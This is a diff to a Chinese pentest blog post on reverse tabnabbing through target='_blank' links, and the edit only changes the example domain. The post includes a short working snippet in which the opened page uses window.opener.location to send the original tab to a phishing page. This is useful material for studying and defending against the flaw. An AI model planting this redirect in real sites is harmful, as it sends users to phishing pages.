@@ -9,15 +9,15 @@ topics = ["Pentest"]
 +++
 
 ### 0x00 _blank
-_blank是html中的标签属性，如```<a target="_blank" href="http://xss.reber-9.com/1.php">HELLO</a>```, 但若点击HELLO打开的网页1.php中有如下代码：
+_blank是html中的标签属性，如```<a target="_blank" href="http://xss.reber.com/1.php">HELLO</a>```, 但若点击HELLO打开的网页1.php中有如下代码：
 ```
 <script>
 if(window.opener){
-  window.opener.location  = "http://xss.reber-9.com/fish.html";
+  window.opener.location  = "http://xss.reber.com/fish.html";
 }
 </script>
 ```
-则原网页将转跳到http://xss.reber-9.com/fish.html ，这就会造成钓鱼
+则原网页将转跳到http://xss.reber.com/fish.html ，这就会造成钓鱼
 
 ### 0x01 简单模板
 * a.html内容如下：
@@ -30,12 +30,12 @@ if(window.opener){
     <title>Document</title>
 </head>
 <body>
-    <a target="_blank" href="http://xss.reber-9.com/1.php">HELLO</a>
+    <a target="_blank" href="http://xss.reber.com/1.php">HELLO</a>
 </body>
 </html>
 ```
 
-* ```http://xss.reber-9.com/1.php```中1.php内容如下：
+* ```http://xss.reber.com/1.php```中1.php内容如下：
 
 ```
 <html>
@@ -43,7 +43,7 @@ if(window.opener){
     <title>test</title>
     <script>
         if(window.opener){
-            window.opener.location = "http://xss.reber-9.com/fish.html";
+            window.opener.location = "http://xss.reber.com/fish.html";
         }
     </script>
 </head>
